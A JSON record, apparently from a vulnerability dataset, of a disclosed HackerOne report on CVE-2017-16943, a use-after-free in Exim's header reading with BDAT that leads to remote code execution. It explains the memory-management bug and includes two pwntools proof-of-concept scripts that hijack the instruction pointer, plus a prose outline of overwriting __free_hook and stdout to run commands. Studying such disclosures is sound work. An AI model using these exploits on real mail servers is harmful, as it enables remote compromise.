{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "mehqq ",
  "title": "Exim use-after-free vulnerability while reading mail header involving BDAT commands",
  "content": "\nOriginal article is here\nUse-after-free in receive_msg leads to RCE\nVulnerability Analysis\nTo explain this bug, we need to start with the memory management of exim. There is a series of functions starts with store_ such as store_get, store_release, store_reset. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:\n\nInitially, exim allocates a big storeblock (default 0x2000) and then cut it into stores when store_get is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the current_block is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes current_block point to it. Exim maintains three store_pool, that is, there are three chains like the illustration above and every global variables are actually arrays.\nThis vulnerability is in receive_msg where exim reads headers:\nreceive.c: 1817 receive_msg\nCode 346 Bytes\n1  if (ptr >= header_size - 4)\n2    {\n3    int oldsize = header_size;\n4    /* header_size += 256; */\n5    header_size *= 2;\n6    if (!store_extend(next->text, oldsize, header_size))\n7      {\n8      uschar *newtext = store_get(header_size);\n9      memcpy(newtext, next->text, ptr);\n10      store_release(next->text);\n11      next->text = newtext;\n12      }\n13    }\nIt seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to extend store, the function store_extend checks whether the old store is the latest store allocated in current_block. It returns False immediately if the check is failed.\nstore.c: 276 store_extend\nCode 142 Bytes\n1if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||\n2    inc > yield_length[store_pool] + rounded_oldsize - oldsize)\n3  return FALSE;\nOnce store_extend fails, exim tries to get a new store and release the old one. After we look into store_get and store_release, we found that store_get returns a store, but store_release releases a block if the store is at the head of it. That is to say, if next->text points to the start the current_block and store_get cuts store inside it for newtext, then store_release(next->text) frees next->text, which is equal to current_block, and leaves newtext and current_block pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call store_get after next->text is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes store_get reachable and finally leads to an RCE.\nExim uses function pointers to switch between different input sources, such as receive_getc, receive_getbuf. When receiving BDAT data, receive_getc is set to bdat_getc in order to check left chunking data size and to handle following command of BDAT. In receive_msg, exim also uses receive_getc. It loops to read data, and stores data into next->text, extends if insufficient.\nreceive.c: 1817 receive_msg\nCode 404 Bytes\n1for (;;)\n2  {\n3  int ch = (receive_getc)(GETC_BUFFER_UNLIMITED);\n4  \n5  /* If we hit EOF on a SMTP connection, it's an error, since incoming\n6  SMTP must have a correct \".\" terminator. */\n7\n8  if (ch == EOF && smtp_input /* && !smtp_batched_input */)\n9    {\n10    smtp_reply = handle_lost_connection(US\" (header)\");\n11    smtp_yield = FALSE;\n12    goto TIDYUP;                       /* Skip to end of function */\n13    }\nIn bdat_getc, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect.\nsmtp_in.c: 628 bdat_getc\nCode 227 Bytes\n1    case BDAT_CMD:\n2      {\n3      int n;\n4\n5      if (sscanf(CS smtp_cmd_data, \"%u %n\", &chunking_datasize, &n) < 1)\n6\t{\n7\t(void) synprot_error(L_smtp_protocol_error, 501, NULL,\n8\t  US\"missing size for BDAT command\");\n9\treturn ERR;\n10\t}\nIn exim, it usually calls synprot_error to raise error message, which also logs at the same time.\nsmtp_in.c: 628 bdat_getc\nCode 277 Bytes\n1static int\n2synprot_error(int type, int code, uschar *data, uschar *errmess)\n3{\n4int yield = -1;\n5\n6log_write(type, LOG_MAIN, \"SMTP %s error in \\\"%s\\\" %s %s\",\n7  (type == L_smtp_syntax_error)? \"syntax\" : \"protocol\",\n8  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);\nThe log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as '\\n'->'\\\\n'. Therefore, it asks store_get for memory to store strings.\nThis store makes if (!store_extend(next->text, oldsize, header_size)) in receive_msg failed when next extension occurs and then triggers use-after-free.\nExploitation\nThe following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to 0xdeadbeef. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when dkim is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.\nCode 488 Bytes\n1# CVE-2017-16943 PoC by meh at DEVCORE\n2# pip install pwntools\n3from pwn import *\n4\n5r = remote('127.0.0.1', 25)\n6\n7r.recvline()\n8r.sendline(\"EHLO test\")\n9r.recvuntil(\"250 HELP\")\n10r.sendline(\"MAIL FROM:<meh@some.domain>\")\n11r.recvline()\n12r.sendline(\"RCPT TO:<meh@some.domain>\")\n13r.recvline()\n14r.sendline('a'*0x1250+'\\x7f')\n15r.recvuntil('command')\n16r.sendline('BDAT 1')\n17r.sendline(':BDAT \\x7f')\n18s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\n19r.send(s+ ':\\r\\n')\n20r.recvuntil('command')\n21r.send('\\n')\n22\n23r.interactive()\nRunning out of current_block\nIn order to achieve code execution, we need to make the next->text get the first store of a block. That is, running out of current_block and making store_get allocate a new block. Therefore, we send a long message 'a'*0x1250+'\\x7f' with an unprintable character to cut current_block, making yield_length less than 0x100.\n\nif (smtp_input && !smtp_batched_input && !dkim_disable_verify)\n\nCall store_getc inside bdat_getc\nThen, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the current_block with store_get in string_printing.\n\nKeep sending msg until extension and bug triggered\nIn this way, while we keep sending huge messages, current_block gets freed after the extension. In the malloc.c of glibc (so called ptmalloc), system manages a linked list of freed memory chunks, which is called unsortbin. Freed chunks are put into unsortbin if it is not the last chunk on the heap. In step 2, dkim_exim_verify_init allocated chunks after next->text. Therefore, this chunk is put into unsortbin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly current_block->next, and therefore current_block->next is overwritten to unsortbin inside main_arena of libc (linked list pointer fd points back to unsortbin if no other freed chunk exists).\n\nKeep sending msg for the next extension\nWhen the next extension occurs, store_get tries to cut from main_arena, which makes attackers able to overwrite all global variables below main_arena.\nOverwrite global variables in libc\nFinish sending message and trigger free()\nIn the PoC, we simply modified __free_hook and ended the line. Exim calls store_reset to reset the buffer and calls __free_hook in free(). At this stage, we successfully controlled instruction pointer $rip.\nHowever, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both __free_hook and _IO_2_1_stdout_. We forged the vtable of stdout and set __free_hook to any call of fflush(stdout) inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both $rip and the content of first argument.\nWe consulted past CVE exploits and decided to call expand_string, which executes command with execv if we set the first argument to ${run{cmd}}, and finally we got our RCE.\n\nExploit for default configured exim\nWhen dkim is disabled, the PoC above fails because current_block is the last chunk on heap. This makes the system merge it into a big chunk called top chunk rather than unsortbin.\nThe illustrations below describe the difference of heap layout:\n\n\nTo avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.\nAfter running out of current_block:\nUse DATA command to send lots of data Send huge data, make the chunk big and extend many times. After several extension, it calls store_get to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsortbin.\nEnd DATA transfer and start a new email Restart to send an email with BDAT command after the heap chunk is prepared.\nAdjust yield_length again Send invalid command with an unprintable charater again to cut the current_block.\nFinally the heap layout is like:\n\nAnd now we can go back to the step 2 at the beginning and create the same situation. When next->text is freed, it goes back to unsortbin and we are able to overwrite libc global variables again.\nThe following is the PoC for default configured exim:\nCode 724 Bytes\n1# CVE-2017-16943 PoC by meh at DEVCORE\n2# pip install pwntools\n3from pwn import *\n4\n5r = remote('localhost', 25)\n6\n7r.recvline()\n8r.sendline(\"EHLO test\")\n9r.recvuntil(\"250 HELP\")\n10r.sendline(\"MAIL FROM:<>\")\n11r.recvline()\n12r.sendline(\"RCPT TO:<meh@some.domain>\")\n13r.recvline()\n14r.sendline('a'*0x1280+'\\x7f')\n15r.recvuntil('command')\n16r.sendline('DATA')\n17r.recvuntil('itself\\r\\n')\n18r.sendline('b'*0x4000+':\\r\\n')\n19r.sendline('.\\r\\n')\n20r.sendline('.\\r\\n')\n21r.recvline()\n22r.sendline(\"MAIL FROM:<>\")\n23r.recvline()\n24r.sendline(\"RCPT TO:<meh@some.domain>\")\n25r.recvline()\n26r.sendline('a'*0x3480+'\\x7f')\n27r.recvuntil('command')\n28r.sendline('BDAT 1')\n29r.sendline(':BDAT \\x7f')\n30s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\n31r.send(s+ ':\\r\\n')\n32r.send('\\n')\n33r.interactive()\nA demo of our exploit is as below.\n\nNote that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.\nImpact\nRemote code execution on remote mail server, affecting over 500k mail servers.\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Use After Free"
  ],
  "screenshots": {},
  "disclosed_date": 1573620300,
  "report_url": "https://hackerone.com/reports/296991",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Send a long message with an unprintable character to cut current_block and make yield_length less than 0x100."
    ],
    [
      2,
      "Send a BDAT command without SIZE to trigger an error message, which calls store_get in string_printing."
    ],
    [
      3,
      "Keep sending huge messages to trigger the use-after-free vulnerability when current_block gets freed after extension."
    ],
    [
      4,
      "Overwrite global variables in libc by manipulating the freed memory chunk to control the instruction pointer."
    ],
    [
      5,
      "Finish sending the message and trigger free() to execute arbitrary code via __free_hook."
    ]
  ],
  "vuln_description": "This vulnerability is a use-after-free in Exim's receive_msg function while reading mail headers involving BDAT commands. It occurs due to improper memory management in store functions (store_get, store_release, store_reset), leading to a freed memory area being reused. Attackers can exploit this to achieve remote code execution by manipulating the heap and overwriting critical memory pointers.",
  "reason": "The vulnerability involves multiple complex components: understanding Exim's custom memory management system, manipulating heap allocations through BDAT commands, triggering error paths that lead to memory reallocation, and carefully orchestrating a use-after-free condition to overwrite critical pointers. The attack requires deep knowledge of both Exim's internals and glibc heap management.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}